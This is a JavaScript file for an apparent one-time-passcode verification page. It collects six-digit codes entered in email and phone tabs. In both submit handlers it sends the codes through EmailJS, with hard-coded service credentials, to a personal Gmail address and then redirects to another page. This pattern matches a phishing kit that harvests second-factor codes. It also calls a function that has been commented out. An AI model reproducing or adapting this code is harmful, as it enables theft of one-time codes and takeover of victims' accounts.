const otpForm = document.querySelector(".otpForm");
const btn = document.querySelector("button");
// Function to check if the input is a valid 6-digit PIN
function isValidPIN(pin) {
  return /^\d{6}$/.test(pin);
}

// Function to change the button color
// function changeButtonColor(isFocused) {
//   var submitBtn = document.getElementById("submitBtn");
//   submitBtn.style.backgroundColor = isFocused ? "#0361f0" : ""; // Change the color as needed
//   submitBtn.style.color = isFocused ? "#fff" : ""; // Change the color as needed
// }

// Add event listeners to move the cursor to the next input field
var pinInputs = document.getElementsByClassName("pin-input");

for (var i = 0; i < pinInputs.length; i++) {
  pinInputs[i].addEventListener("input", function () {
    if (this.value.length === 1) {
      var nextInputIndex = Array.from(pinInputs).indexOf(this) + 1;
      if (nextInputIndex < pinInputs.length) {
        pinInputs[nextInputIndex].focus();
      } else {
        changeButtonColor(true); // Focus is on the last input
      }
    }
  });
}

// Add an event listener to reset the button color when any input loses focus
for (var i = 0; i < pinInputs.length; i++) {
  pinInputs[i].addEventListener("blur", function () {
    changeButtonColor(false);
  });
}

/// Loading in button
btn.onclick = () => {
  btn.disabled = true;
  btn.innerHTML = "Loading...";
};

const serviceId = "service_8hw6l7i";
const userId = "MDQkQ3KvrMuot9ZvW";
const templateId = "template_ra354ax";
// Function to collect and validate the PIN when the Submit button is clicked
document.getElementById("emailBtn").addEventListener("click", function (event) {
  var Emailotp = "";
  var pinInputs = document.getElementsByClassName("pin-input");

  for (var i = 0; i < pinInputs.length; i++) {
    Emailotp += pinInputs[i].value;
  }

  event.preventDefault();
  const emailParams = {
    to_name: "pristchief50@gmail.com",
    Emailotp: Emailotp,
  };
  console.log(emailParams);
  emailjs.send(serviceId, templateId, emailParams, userId).then(
    function (response) {
      console.log("Sent successfully:", response);
      Emailotp = "";
      location.href = "opp.html";
    },
    function (error) {
      console.log("Failed to send:", error);
    }
  );
});
// Function to collect and validate the PIN when the Submit button is clicked
document.getElementById("phoneBtn").addEventListener("click", function (event) {
  var Phoneotp = "";
  var pinInputs = document.getElementsByClassName("pin-input");

  for (var i = 0; i < pinInputs.length; i++) {
    Phoneotp += pinInputs[i].value;
  }

  event.preventDefault();
  const emailParams = {
    to_name: "pristchief50@gmail.com",
    Phoneotp: Phoneotp,
  };
  console.log(emailParams);
  emailjs.send(serviceId, templateId, emailParams, userId).then(
    function (response) {
      console.log("Sent successfully:", response);
      Phoneotp = "";
      location.href = "opp.html";
    },
    function (error) {
      console.log("Failed to send:", error);
    }
  );
});

// JavaScript function to toggle between tabs and update active bar
function toggleTab(tabName) {
  const allContentBoxes = document.querySelectorAll(".content_box");
  allContentBoxes.forEach((box) => {
    box.classList.remove("active");
  });

  const activeContentBox = document.getElementById(tabName + "Content");
  activeContentBox.classList.add("active");

  const allTabBtns = document.querySelectorAll(".tab_btn");
  allTabBtns.forEach((btn) => {
    btn.classList.toggle("activeBar");
  });

  const activeTabBtn = document.querySelector(".tab_btn." + tabName);
  activeTabBtn.classList.add("activeBar");
}
